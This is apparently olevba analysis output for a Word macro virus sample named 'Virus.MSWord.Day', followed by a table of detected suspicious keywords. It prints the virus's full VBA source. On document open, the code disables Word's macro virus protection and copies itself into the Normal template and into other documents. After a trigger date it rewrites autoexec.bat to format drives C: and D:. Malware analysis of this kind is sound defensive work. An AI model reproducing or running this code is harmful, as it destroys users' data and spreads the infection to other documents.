olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Day
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Day - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' it is a good day to die
Private Sub Document_Open()
 On Error Resume Next
 If Date > #6/1/99# Then
  Open "c:\autoexec.bat" For Output As #1
  Print #1, "@echo off"
  Print #1, "break = off"
  Print #1, "echo Y | c:\windows\command\format c: /v:FUCK"
  Print #1, "echo Y | c:\windows\command\format d: /v:FUCK"
  Close #1
 End If
  Application.Options.VirusProtection = False
 With Application.VBE.VBProjects.Item("Normal").VBComponents.Item("ThisDocument").CodeModule
  If .Lines(1, 1) <> "' it is a good day to die" Then
        .DeleteLines 1, .CountOfLines
        .AddFromString ActiveDocument.VBProject.VBComponents.Item("ThisDocument").CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item("ThisDocument").CodeModule.CountOfLines)
  End If
 End With
 With ActiveDocument.VBProject.VBComponents.Item("ThisDocument").CodeModule
  If .Lines(1, 1) <> "' it is a good day to die" Then
        .DeleteLines 1, .CountOfLines
        .AddFromString Application.VBE.VBProjects.Item("Normal").VBComponents.Item("ThisDocument").CodeModule.Lines(1, Application.VBE.VBProjects.Item("Normal").VBComponents.Item("ThisDocument").CodeModule.CountOfLines)
  End If
 End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

